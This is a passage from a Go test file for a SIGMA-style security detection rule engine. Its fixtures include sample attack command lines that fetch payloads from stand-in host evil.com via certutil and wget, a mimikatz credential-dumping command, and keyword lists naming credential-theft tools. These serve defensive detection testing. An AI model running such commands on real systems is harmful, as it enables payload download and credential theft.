	if msg != expected {
		t.Errorf("FormatMessage with IP: got %q, want %q", msg, expected)
	}
}

func TestFormatMessage_WithUsername(t *testing.T) {
	cr := &CompiledRule{
		Title:    "Privilege Escalation",
		Severity: types.SeverityCritical,
	}
	event := makeEvent(map[string]string{"username": "admin"})
	msg := cr.FormatMessage(event)
	expected := "[critical] Privilege Escalation (user: admin)"
	if msg != expected {
		t.Errorf("FormatMessage with user: got %q, want %q", msg, expected)
	}
}

func TestFormatMessage_WithBothIPAndUsername(t *testing.T) {
	cr := &CompiledRule{
		Title:    "Suspicious Login",
		Severity: types.SeverityMedium,
	}
	event := makeEvent(map[string]string{
		"source_ip": "192.168.1.100",
		"username":  "root",
	})
	msg := cr.FormatMessage(event)
	expected := "[medium] Suspicious Login from 192.168.1.100 (user: root)"
	if msg != expected {
		t.Errorf("FormatMessage with both: got %q, want %q", msg, expected)
	}
}

func TestFormatMessage_SeverityStrings(t *testing.T) {
	tests := []struct {
		sev  types.Severity
		want string
	}{
		{types.SeverityInfo, "[info]"},
		{types.SeverityLow, "[low]"},
		{types.SeverityMedium, "[medium]"},
		{types.SeverityHigh, "[high]"},
		{types.SeverityCritical, "[critical]"},
	}
	for _, tc := range tests {
		cr := &CompiledRule{Title: "X", Severity: tc.sev}
		msg := cr.FormatMessage(makeEvent(map[string]string{}))
		if msg != tc.want+" X" {
			t.Errorf("FormatMessage severity %v: got %q, want %q", tc.sev, msg, tc.want+" X")
		}
	}
}

// ===========================================================================
// 6. RuleAction.ResolveTarget
// ===========================================================================

func TestResolveTarget_EmptyTargetField(t *testing.T) {
	a := RuleAction{Type: types.ActionBlockIP, TargetField: ""}
	event := makeEvent(map[string]string{"source_ip": "10.0.0.1"})
	if result := a.ResolveTarget(event); result != "" {
		t.Errorf("ResolveTarget empty field: got %q, want empty", result)
	}
}

func TestResolveTarget_FieldNotInEvent(t *testing.T) {
	a := RuleAction{Type: types.ActionBlockIP, TargetField: "source_ip"}
	event := makeEvent(map[string]string{"other": "value"})
	if result := a.ResolveTarget(event); result != "" {
		t.Errorf("ResolveTarget missing field: got %q, want empty", result)
	}
}

func TestResolveTarget_FieldPresent(t *testing.T) {
	a := RuleAction{Type: types.ActionBlockIP, TargetField: "source_ip"}
	event := makeEvent(map[string]string{"source_ip": "203.0.113.5"})
	if result := a.ResolveTarget(event); result != "203.0.113.5" {
		t.Errorf("ResolveTarget present: got %q, want %q", result, "203.0.113.5")
	}
}

func TestResolveTarget_DisableUser(t *testing.T) {
	a := RuleAction{Type: types.ActionDisableUser, TargetField: "username"}
	event := makeEvent(map[string]string{"username": "attacker"})
	if result := a.ResolveTarget(event); result != "attacker" {
		t.Errorf("ResolveTarget user: got %q, want %q", result, "attacker")
	}
}

// ===========================================================================
// 7. LoadRulesFromDir
// ===========================================================================

func TestLoadRulesFromDir_LoadsYAMLFiles(t *testing.T) {
	dir := t.TempDir()

	ruleYAML := `id: test-001
title: Test Rule One
description: A test rule
severity: high
status: active
logsource:
  category: auth
detection:
  selection:
    username: root
  condition: selection
`
	if err := os.WriteFile(filepath.Join(dir, "rule1.yml"), []byte(ruleYAML), 0644); err != nil {
		t.Fatal(err)
	}

	ruleYAML2 := `id: test-002
title: Test Rule Two
severity: low
status: test
logsource:
  category: network
detection:
  selection:
    action: drop
  condition: selection
`
	if err := os.WriteFile(filepath.Join(dir, "rule2.yaml"), []byte(ruleYAML2), 0644); err != nil {
		t.Fatal(err)
	}

	rules, err := LoadRulesFromDir(dir)
	if err != nil {
		t.Fatalf("LoadRulesFromDir error: %v", err)
	}
	if len(rules) != 2 {
		t.Fatalf("rules count: got %d, want 2", len(rules))
	}

	// Verify we got both rules (order may vary due to directory listing).
	ids := map[string]bool{}
	for _, r := range rules {
		ids[r.ID] = true
	}
	if !ids["test-001"] || !ids["test-002"] {
		t.Errorf("expected rules test-001 and test-002, got IDs: %v", ids)
	}
}

func TestLoadRulesFromDir_SkipsNonYAMLFiles(t *testing.T) {
	dir := t.TempDir()

	ruleYAML := `id: only-rule
title: Only Rule
severity: medium
detection:
  selection:
    action: login
  condition: selection
`
	if err := os.WriteFile(filepath.Join(dir, "rule.yml"), []byte(ruleYAML), 0644); err != nil {
		t.Fatal(err)
	}
	// Write non-YAML files that should be skipped.
	if err := os.WriteFile(filepath.Join(dir, "readme.txt"), []byte("not a rule"), 0644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "notes.md"), []byte("# notes"), 0644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "config.json"), []byte("{}"), 0644); err != nil {
		t.Fatal(err)
	}

	rules, err := LoadRulesFromDir(dir)
	if err != nil {
		t.Fatalf("LoadRulesFromDir error: %v", err)
	}
	if len(rules) != 1 {
		t.Fatalf("rules count: got %d, want 1 (non-YAML files should be skipped)", len(rules))
	}
	if rules[0].ID != "only-rule" {
		t.Errorf("ID: got %q, want %q", rules[0].ID, "only-rule")
	}
}

func TestLoadRulesFromDir_SkipsDirectories(t *testing.T) {
	dir := t.TempDir()

	// Create a subdirectory (should be skipped).
	subdir := filepath.Join(dir, "subdir")
	if err := os.Mkdir(subdir, 0755); err != nil {
		t.Fatal(err)
	}
	// Put a YAML file inside the subdirectory (should not be loaded -- non-recursive).
	if err := os.WriteFile(filepath.Join(subdir, "nested.yml"), []byte("id: nested\ntitle: Nested"), 0644); err != nil {
		t.Fatal(err)
	}

	ruleYAML := `id: top-rule
title: Top Rule
severity: low
detection:
  selection:
    action: test
  condition: selection
`
	if err := os.WriteFile(filepath.Join(dir, "top.yml"), []byte(ruleYAML), 0644); err != nil {
		t.Fatal(err)
	}

	rules, err := LoadRulesFromDir(dir)
	if err != nil {
		t.Fatalf("LoadRulesFromDir error: %v", err)
	}
	if len(rules) != 1 {
		t.Fatalf("rules count: got %d, want 1 (directories should be skipped)", len(rules))
	}
	if rules[0].ID != "top-rule" {
		t.Errorf("ID: got %q, want %q", rules[0].ID, "top-rule")
	}
}

func TestLoadRulesFromDir_EmptyDirectory(t *testing.T) {
	dir := t.TempDir()
	rules, err := LoadRulesFromDir(dir)
	if err != nil {
		t.Fatalf("LoadRulesFromDir error: %v", err)
	}
	if len(rules) != 0 {
		t.Errorf("rules count: got %d, want 0 for empty dir", len(rules))
	}
}

func TestLoadRulesFromDir_NonexistentDirectory(t *testing.T) {
	_, err := LoadRulesFromDir(filepath.Join(t.TempDir(), "nonexistent"))
	if err == nil {
		t.Fatal("expected error for nonexistent directory, got nil")
	}
}

func TestLoadRulesFromDir_InvalidYAML(t *testing.T) {
	dir := t.TempDir()
	badYAML := "id: test\ntitle: Test\ndetection:\n  selection:\n    field|badmod: value\n"
	if err := os.WriteFile(filepath.Join(dir, "bad.yml"), []byte(badYAML), 0644); err != nil {
		t.Fatal(err)
	}
	rules, err := LoadRulesFromDir(dir)
	if err != nil {
		// An actual parse error is fine too.
		return
	}
	// If parsing succeeded, the rule should at least have loaded.
	if len(rules) != 1 {
		t.Fatalf("expected 1 rule loaded, got %d", len(rules))
	}
}

// ===========================================================================
// 8. LoadRuleFile
// ===========================================================================

func TestLoadRuleFile_ValidRule(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "valid_rule.yml")
	content := `id: file-001
title: File Rule
description: Loaded from file
severity: critical
status: active
author: tester
tags:
  - apt
  - malware
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    command_line|contains: certutil
  condition: selection
response:
  - type: block_ip
    target_field: source_ip
`
	if err := os.WriteFile(path, []byte(content), 0644); err != nil {
		t.Fatal(err)
	}

	rule, err := LoadRuleFile(path)
	if err != nil {
		t.Fatalf("LoadRuleFile error: %v", err)
	}
	if rule.ID != "file-001" {
		t.Errorf("ID: got %q, want %q", rule.ID, "file-001")
	}
	if rule.Title != "File Rule" {
		t.Errorf("Title: got %q, want %q", rule.Title, "File Rule")
	}
	if rule.Severity != "critical" {
		t.Errorf("Severity: got %q, want %q", rule.Severity, "critical")
	}
	if rule.Author != "tester" {
		t.Errorf("Author: got %q, want %q", rule.Author, "tester")
	}
	if len(rule.Tags) != 2 {
		t.Fatalf("Tags count: got %d, want 2", len(rule.Tags))
	}
	if rule.LogSource.Category != "process_creation" {
		t.Errorf("LogSource.Category: got %q, want %q", rule.LogSource.Category, "process_creation")
	}
	if rule.LogSource.Product != "windows" {
		t.Errorf("LogSource.Product: got %q, want %q", rule.LogSource.Product, "windows")
	}
	if len(rule.Response) != 1 {
		t.Fatalf("Response count: got %d, want 1", len(rule.Response))
	}
	if rule.Response[0].Type != types.ActionBlockIP {
		t.Errorf("Response[0].Type: got %q, want %q", rule.Response[0].Type, types.ActionBlockIP)
	}
}

func TestLoadRuleFile_FallbackID(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "my_fallback_rule.yml")
	// No "id" field -- should use filename without extension.
	content := `title: Fallback ID Rule
severity: low
detection:
  selection:
    action: test
  condition: selection
`
	if err := os.WriteFile(path, []byte(content), 0644); err != nil {
		t.Fatal(err)
	}

	rule, err := LoadRuleFile(path)
	if err != nil {
		t.Fatalf("LoadRuleFile error: %v", err)
	}
	if rule.ID != "my_fallback_rule" {
		t.Errorf("Fallback ID: got %q, want %q", rule.ID, "my_fallback_rule")
	}
}

func TestLoadRuleFile_FallbackID_YamlExtension(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "another_rule.yaml")
	content := `title: YAML Extension Rule
severity: medium
detection:
  selection:
    action: test
  condition: selection
`
	if err := os.WriteFile(path, []byte(content), 0644); err != nil {
		t.Fatal(err)
	}

	rule, err := LoadRuleFile(path)
	if err != nil {
		t.Fatalf("LoadRuleFile error: %v", err)
	}
	if rule.ID != "another_rule" {
		t.Errorf("Fallback ID (.yaml ext): got %q, want %q", rule.ID, "another_rule")
	}
}

func TestLoadRuleFile_NonexistentFile(t *testing.T) {
	_, err := LoadRuleFile(filepath.Join(t.TempDir(), "does_not_exist.yml"))
	if err == nil {
		t.Fatal("expected error for nonexistent file, got nil")
	}
}

func TestLoadRuleFile_InvalidYAML(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "broken.yml")
	// Truly invalid YAML with bad indentation / tab mixing
	badContent := "id: test\n\t\ttitle: broken\n  severity: {\n"
	if err := os.WriteFile(path, []byte(badContent), 0644); err != nil {
		t.Fatal(err)
	}
	_, err := LoadRuleFile(path)
	if err == nil {
		t.Fatal("expected error for invalid YAML, got nil")
	}
}

func TestLoadRuleFile_ExplicitIDNotOverridden(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "filename_id.yml")
	content := `id: explicit-id
title: Explicit ID
severity: low
detection:
  selection:
    action: test
  condition: selection
`
	if err := os.WriteFile(path, []byte(content), 0644); err != nil {
		t.Fatal(err)
	}

	rule, err := LoadRuleFile(path)
	if err != nil {
		t.Fatalf("LoadRuleFile error: %v", err)
	}
	if rule.ID != "explicit-id" {
		t.Errorf("ID: got %q, want %q (explicit ID should not be overridden)", rule.ID, "explicit-id")
	}
}

// ===========================================================================
// Integration-style: CompileRule + Matches end-to-end
// ===========================================================================

func TestEndToEnd_CompileAndMatch(t *testing.T) {
	rule := Rule{
		ID:       "e2e-001",
		Title:    "SSH Brute Force",
		Severity: "high",
		Status:   "active",
		LogSource: RuleLogSource{
			Category: "auth",
			Product:  "linux",
		},
		Detection: RuleDetection{
			Selection: map[string]interface{}{
				"action":               "failed_login",
				"service":              "sshd",
				"username|contains":    "root",
				"source_ip|startswith": "10.",
			},
			Filter: map[string]interface{}{
				"source_ip": "10.0.0.1", // trusted IP excluded
			},
			Condition: "selection and not filter",
		},
	}

	compiled, err := CompileRule(rule)
	if err != nil {
		t.Fatalf("CompileRule error: %v", err)
	}

	// Should match: all conditions met, filter does not apply.
	goodEvent := types.LogEvent{
		Category: "auth",
		Platform: "linux",
		Fields: map[string]string{
			"action":    "failed_login",
			"service":   "sshd",
			"username":  "root",
			"source_ip": "10.0.0.99",
		},
	}
	if !compiled.Matches(goodEvent) {
		t.Error("end-to-end: expected match for valid event")
	}

	// Should NOT match: filter excludes trusted IP.
	filteredEvent := types.LogEvent{
		Category: "auth",
		Platform: "linux",
		Fields: map[string]string{
			"action":    "failed_login",
			"service":   "sshd",
			"username":  "root",
			"source_ip": "10.0.0.1",
		},
	}
	if compiled.Matches(filteredEvent) {
		t.Error("end-to-end: expected filter to exclude trusted IP")
	}

	// Should NOT match: wrong category.
	wrongCategory := types.LogEvent{
		Category: "network",
		Platform: "linux",
		Fields: map[string]string{
			"action":    "failed_login",
			"service":   "sshd",
			"username":  "root",
			"source_ip": "10.0.0.99",
		},
	}
	if compiled.Matches(wrongCategory) {
		t.Error("end-to-end: expected no match for wrong category")
	}

	// Should NOT match: wrong product/platform.
	wrongPlatform := types.LogEvent{
		Category: "auth",
		Platform: "windows",
		Fields: map[string]string{
			"action":    "failed_login",
			"service":   "sshd",
			"username":  "root",
			"source_ip": "10.0.0.99",
		},
	}
	if compiled.Matches(wrongPlatform) {
		t.Error("end-to-end: expected no match for wrong platform")
	}

	// Should NOT match: condition not met (username does not contain root).
	noRoot := types.LogEvent{
		Category: "auth",
		Platform: "linux",
		Fields: map[string]string{
			"action":    "failed_login",
			"service":   "sshd",
			"username":  "admin",
			"source_ip": "10.0.0.99",
		},
	}
	if compiled.Matches(noRoot) {
		t.Error("end-to-end: expected no match when username does not contain root")
	}
}

func TestEndToEnd_FormatMessageAndResolveTarget(t *testing.T) {
	rule := Rule{
		ID:       "e2e-002",
		Title:    "Credential Dump",
		Severity: "critical",
		Status:   "active",
		Detection: RuleDetection{
			Selection: map[string]interface{}{
				"command_line|contains": "mimikatz",
			},
		},
		Response: []RuleAction{
			{Type: types.ActionBlockIP, TargetField: "source_ip"},
			{Type: types.ActionKillProcess, TargetField: "pid"},
		},
	}

	compiled, err := CompileRule(rule)
	if err != nil {
		t.Fatalf("CompileRule error: %v", err)
	}

	event := makeEvent(map[string]string{
		"command_line": "mimikatz.exe sekurlsa::logonpasswords",
		"source_ip":    "10.5.5.5",
		"pid":          "4321",
		"username":     "attacker",
	})

	msg := compiled.FormatMessage(event)
	expected := "[critical] Credential Dump from 10.5.5.5 (user: attacker)"
	if msg != expected {
		t.Errorf("FormatMessage: got %q, want %q", msg, expected)
	}

	if target := compiled.Actions[0].ResolveTarget(event); target != "10.5.5.5" {
		t.Errorf("ResolveTarget[0]: got %q, want %q", target, "10.5.5.5")
	}
	if target := compiled.Actions[1].ResolveTarget(event); target != "4321" {
		t.Errorf("ResolveTarget[1]: got %q, want %q", target, "4321")
	}
}

func TestEndToEnd_RegexRuleMatch(t *testing.T) {
	rule := Rule{
		ID:       "e2e-regex",
		Title:    "Regex Match Test",
		Severity: "medium",
		Status:   "active",
		Detection: RuleDetection{
			Selection: map[string]interface{}{
				"url|re": `^/admin/.*\.(php|asp)$`,
			},
		},
	}

	compiled, err := CompileRule(rule)
	if err != nil {
		t.Fatalf("CompileRule error: %v", err)
	}

	match := makeEvent(map[string]string{"url": "/admin/shell.php"})
	if !compiled.Matches(match) {
		t.Error("regex e2e: expected match for /admin/shell.php")
	}

	noMatch := makeEvent(map[string]string{"url": "/admin/index.html"})
	if compiled.Matches(noMatch) {
		t.Error("regex e2e: expected no match for /admin/index.html")
	}
}

func TestEndToEnd_OpInRuleMatch(t *testing.T) {
	rule := Rule{
		ID:       "e2e-in",
		Title:    "OpIn Test",
		Severity: "low",
		Status:   "active",
		Detection: RuleDetection{
			Selection: map[string]interface{}{
				"action": []interface{}{"drop", "reject", "block"},
			},
		},
	}

	compiled, err := CompileRule(rule)
	if err != nil {
		t.Fatalf("CompileRule error: %v", err)
	}

	match := makeEvent(map[string]string{"action": "REJECT"})
	if !compiled.Matches(match) {
		t.Error("OpIn e2e: expected case-insensitive match for REJECT")
	}

	noMatch := makeEvent(map[string]string{"action": "allow"})
	if compiled.Matches(noMatch) {
		t.Error("OpIn e2e: expected no match for allow")
	}
}

func TestEndToEnd_DisabledRuleStillCompiles(t *testing.T) {
	rule := Rule{
		ID:       "e2e-disabled",
		Title:    "Disabled Rule",
		Severity: "high",
		Status:   "disabled",
		Detection: RuleDetection{
			Selection: map[string]interface{}{
				"action": "login",
			},
		},
	}

	compiled, err := CompileRule(rule)
	if err != nil {
		t.Fatalf("CompileRule error: %v", err)
	}

	if compiled.Enabled {
		t.Error("disabled rule should have Enabled=false")
	}

	// Matches still works (Enabled is just a flag, not enforced by Matches).
	event := makeEvent(map[string]string{"action": "login"})
	if !compiled.Matches(event) {
		t.Error("Matches should still evaluate even when Enabled=false")
	}
}

func TestEndToEnd_LoadFileCompileMatch(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "detect_certutil.yml")
	content := `id: certutil-download
title: Certutil Download
description: Detects certutil used for downloading
severity: high
status: active
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    command_line|contains: certutil
  condition: selection
response:
  - type: kill_process
    target_field: pid
`
	if err := os.WriteFile(path, []byte(content), 0644); err != nil {
		t.Fatal(err)
	}

	rule, err := LoadRuleFile(path)
	if err != nil {
		t.Fatalf("LoadRuleFile error: %v", err)
	}

	compiled, err := CompileRule(*rule)
	if err != nil {
		t.Fatalf("CompileRule error: %v", err)
	}

	event := types.LogEvent{
		Category: "process_creation",
		Platform: "windows",
		Fields: map[string]string{
			"command_line": "certutil -urlcache -split -f http://evil.com/payload.exe",
			"pid":          "1234",
		},
	}

	if !compiled.Matches(event) {
		t.Error("full pipeline: expected match for certutil event")
	}

	if target := compiled.Actions[0].ResolveTarget(event); target != "1234" {
		t.Errorf("full pipeline ResolveTarget: got %q, want %q", target, "1234")
	}
}

// ===========================================================================
// 8. Named Selections (SIGMA-style condition groups)
// ===========================================================================

func TestNamedSelections_ORLogic(t *testing.T) {
	rule := Rule{
		ID:       "named-or",
		Title:    "Named OR Test",
		Severity: "high",
		Detection: RuleDetection{
			Selections: map[string]map[string]interface{}{
				"selection_a": {"raw|contains": "mimikatz"},
				"selection_b": {"raw|contains": "powershell"},
			},
			Condition: "selection_a or selection_b",
		},
	}

	compiled, err := CompileRule(rule)
	if err != nil {
		t.Fatalf("CompileRule: %v", err)
	}

	if len(compiled.ConditionGroups) != 2 {
		t.Fatalf("expected 2 condition groups, got %d", len(compiled.ConditionGroups))
	}
	if compiled.ConditionLogic != "or" {
		t.Errorf("expected 'or' logic, got %q", compiled.ConditionLogic)
	}

	event1 := makeEvent(map[string]string{})
	event1.Raw = "found mimikatz running"
	if !compiled.Matches(event1) {
		t.Error("expected match on selection_a (mimikatz)")
	}

	event2 := makeEvent(map[string]string{})
	event2.Raw = "powershell -enc abc"
	if !compiled.Matches(event2) {
		t.Error("expected match on selection_b (powershell)")
	}

	event3 := makeEvent(map[string]string{})
	event3.Raw = "normal event"
	if compiled.Matches(event3) {
		t.Error("expected no match on unrelated event")
	}
}

func TestNamedSelections_ANDLogic(t *testing.T) {
	rule := Rule{
		ID:       "named-and",
		Title:    "Named AND Test",
		Severity: "high",
		Detection: RuleDetection{
			Selections: map[string]map[string]interface{}{
				"selection_process": {"raw|contains": "cmd.exe"},
				"selection_network": {"raw|contains": "http"},
			},
			Condition: "selection_process and selection_network",
		},
	}

	compiled, err := CompileRule(rule)
	if err != nil {
		t.Fatalf("CompileRule: %v", err)
	}

	if compiled.ConditionLogic != "and" {
		t.Errorf("expected 'and' logic, got %q", compiled.ConditionLogic)
	}

	event1 := makeEvent(map[string]string{})
	event1.Raw = "cmd.exe downloading http://evil.com"
	if !compiled.Matches(event1) {
		t.Error("expected match when both selections are present")
	}

	event2 := makeEvent(map[string]string{})
	event2.Raw = "cmd.exe running locally"
	if compiled.Matches(event2) {
		t.Error("expected no match when only one AND selection matches")
	}
}

func TestNamedSelections_MultipleConditionsPerGroup(t *testing.T) {
	rule := Rule{
		ID:       "named-multi",
		Title:    "Multi-condition Group",
		Severity: "medium",
		Detection: RuleDetection{
			Selections: map[string]map[string]interface{}{
				"selection_attack": {
					"raw|contains":          "wget",
					"command_line|contains": "http",
				},
			},
			Condition: "selection_attack",
		},
	}

	compiled, err := CompileRule(rule)
	if err != nil {
		t.Fatalf("CompileRule: %v", err)
	}

	event1 := makeEvent(map[string]string{
		"command_line": "wget http://evil.com/payload",
	})
	event1.Raw = "wget http://evil.com/payload"
	if !compiled.Matches(event1) {
		t.Error("expected match when all conditions in group match")
	}

	event2 := makeEvent(map[string]string{
		"command_line": "ls -la",
	})
	event2.Raw = "wget some-file-locally"
	if compiled.Matches(event2) {
		t.Error("expected no match when only raw matches but command_line doesn't")
	}
}

func TestNamedSelections_WithFilter(t *testing.T) {
	rule := Rule{
		ID:       "named-filter",
		Title:    "Named With Filter",
		Severity: "high",
		Detection: RuleDetection{
			Selections: map[string]map[string]interface{}{
				"selection_main": {"raw|contains": "suspicious"},
			},
			Filter:    map[string]interface{}{"username": "admin"},
			Condition: "selection_main and not filter",
		},
	}

	compiled, err := CompileRule(rule)
	if err != nil {
		t.Fatalf("CompileRule: %v", err)
	}

	event1 := makeEvent(map[string]string{"username": "attacker"})
	event1.Raw = "suspicious activity detected"
	if !compiled.Matches(event1) {
		t.Error("expected match without filter exclusion")
	}

	event2 := makeEvent(map[string]string{"username": "admin"})
	event2.Raw = "suspicious activity detected"
	if compiled.Matches(event2) {
		t.Error("expected no match: filter should exclude admin")
	}
}

func TestNamedSelections_YAMLUnmarshal(t *testing.T) {
	yamlData := `
selection_tools:
  raw|contains:
    - mimikatz
    - rubeus
selection_commands:
  command_line|contains:
    - sekurlsa
condition: selection_tools or selection_commands
`
	var det RuleDetection
	if err := yaml.Unmarshal([]byte(yamlData), &det); err != nil {
		t.Fatalf("YAML unmarshal: %v", err)
	}

	if len(det.Selections) != 2 {
		t.Fatalf("expected 2 named selections, got %d", len(det.Selections))
	}
	if _, ok := det.Selections["selection_tools"]; !ok {
		t.Error("missing selection_tools")
	}
	if _, ok := det.Selections["selection_commands"]; !ok {
		t.Error("missing selection_commands")
	}
	if det.Condition != "selection_tools or selection_commands" {
		t.Errorf("unexpected condition: %q", det.Condition)
	}
}

func TestNamedSelections_BackwardCompatible(t *testing.T) {
	rule := Rule{
		ID:       "simple-compat",
		Title:    "Simple Selection",
		Severity: "low",
		Detection: RuleDetection{
			Selection: map[string]interface{}{"raw|contains": "error"},
		},
	}

	compiled, err := CompileRule(rule)
	if err != nil {
		t.Fatalf("CompileRule: %v", err)
	}

	if len(compiled.Conditions) != 1 {
		t.Fatalf("expected 1 simple condition, got %d", len(compiled.Conditions))
	}
	if len(compiled.ConditionGroups) != 0 {
		t.Errorf("expected no condition groups for simple selection, got %d", len(compiled.ConditionGroups))
	}

	event := makeEvent(map[string]string{})
	event.Raw = "an error occurred"
	if !compiled.Matches(event) {
		t.Error("expected backward-compatible match")
	}
}

func TestMatchGroup_HelperFunction(t *testing.T) {
	group := []Condition{
		{Field: "raw", Operator: OpContains, Value: "test"},
		{Field: "username", Operator: OpEquals, Value: "admin"},
	}

	event := types.LogEvent{
		Raw:    "test event",
		Fields: map[string]string{"username": "admin"},
	}

	if !matchGroup(group, event) {
		t.Error("expected group to match when all conditions are met")
	}

	event2 := types.LogEvent{
		Raw:    "test event",
		Fields: map[string]string{"username": "user"},
	}
	if matchGroup(group, event2) {
		t.Error("expected group to not match when username differs")
	}

	if matchGroup(nil, event) {
		t.Error("expected empty group to not match")
	}
}

func TestParseConditionLogic(t *testing.T) {
	tests := []struct {
		condition string
		expected  string
	}{
		{"selection_a or selection_b", "or"},
		{"selection_a and selection_b", "and"},
		{"selection_a or selection_b or selection_c", "or"},
		{"selection_main and not filter", "and"},
		{"selection_a", "or"},
		{"", "or"},
		{"selection_a or selection_b and not filter", "or"},
	}

	for _, tc := range tests {
		got := parseConditionLogic(tc.condition)
		if got != tc.expected {
			t.Errorf("parseConditionLogic(%q) = %q, want %q", tc.condition, got, tc.expected)
		}
	}
}
